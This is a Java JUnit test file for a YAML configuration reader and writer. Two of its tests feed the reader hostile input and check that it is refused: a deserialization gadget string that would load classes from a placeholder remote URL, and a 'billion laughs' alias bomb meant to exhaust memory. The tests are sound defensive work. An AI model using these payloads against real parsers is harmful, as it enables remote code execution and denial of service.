/*
 * SPDX-License-Identifier: LGPL-3.0-only
 *
 * Copyright (C) 2026 jvpts11
 *
 * This file is part of J's Core.
 */
package dev.jstech.core.config.format;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

class YamlConfigFormatTest {

    @Test
    void write_thenRead_givesTheSameValues() throws ConfigFormatException {
        final Map<String, Object> inner = new LinkedHashMap<>();
        inner.put("show_menu", true);
        inner.put("wait", 3);
        final Map<String, Object> values = new LinkedHashMap<>();
        values.put("speed", 512);
        values.put("bytes", 5_000_000_000L);
        values.put("factor", 0.6);
        values.put("name", "Frames: 95 # not a comment");
        values.put("words", List.of("a", "b"));
        values.put("boot", inner);

        assertEquals(values, ConfigFormats.YAML.read(ConfigFormats.YAML.write(values, path -> List.of("About"))));
    }

    @Test
    void write_putsEachCommentAboveItsKeyAndTheFilesOnTop() {
        final Map<String, Object> inner = new LinkedHashMap<>();
        inner.put("wait", 3);
        final Map<String, Object> values = new LinkedHashMap<>();
        values.put("speed", 512);
        values.put("boot", inner);

        final String written = new String(ConfigFormats.YAML.write(values, path -> switch (String.join(".", path)) {
            case "" -> List.of("The top of the file");
            case "speed" -> List.of("How fast it goes");
            case "boot.wait" -> List.of("Seconds before it goes on");
            default -> List.of();
        }), StandardCharsets.UTF_8);
        final List<String> lines = written.lines().toList();

        assertEquals("# The top of the file", lines.get(0));
        assertTrue(written.contains("# How fast it goes\nspeed: 512"), written);
        assertTrue(written.contains("# Seconds before it goes on\n  wait: 3"), written);
    }

    @Test
    void write_textYamlWouldReadAsSomethingElse_readsBackAsText() throws ConfigFormatException {
        final Map<String, Object> values = new LinkedHashMap<>();
        values.put("answer", "no");
        values.put("number", "512");
        values.put("nothing", "null");

        assertEquals(values, ConfigFormats.YAML.read(ConfigFormats.YAML.write(values, IConfigComments.NONE)));
    }

    @Test
    void read_aTagNamingAClass_isRefused() {
        final String hostile = "danger: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
                + "[[!!java.net.URL [\"http://example.invalid/\"]]]]\n";

        assertThrows(ConfigFormatException.class,
                () -> ConfigFormats.YAML.read(hostile.getBytes(StandardCharsets.UTF_8)));
    }

    @Test
    void read_aFileBuiltOnAliasesToExhaustTheReader_isRefused() {
        final StringBuilder bomb = new StringBuilder("a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\n");
        char previous = 'a';
        for (char name = 'b'; name <= 'j'; name++) {
            bomb.append(name).append(": &").append(name).append(" [");
            for (int i = 0; i < 9; i++) {
                bomb.append(i == 0 ? "" : ",").append('*').append(previous);
            }
            bomb.append("]\n");
            previous = name;
        }

        assertThrows(ConfigFormatException.class,
                () -> ConfigFormats.YAML.read(bomb.toString().getBytes(StandardCharsets.UTF_8)));
    }

    @Test
    void read_anEmptyFile_holdsNothing() throws ConfigFormatException {
        assertEquals(Map.of(), ConfigFormats.YAML.read(new byte[0]));
    }

    @Test
    void read_whatIsNotAMap_isRefused() {
        assertThrows(ConfigFormatException.class,
                () -> ConfigFormats.YAML.read("- one\n- two\n".getBytes(StandardCharsets.UTF_8)));
    }
}
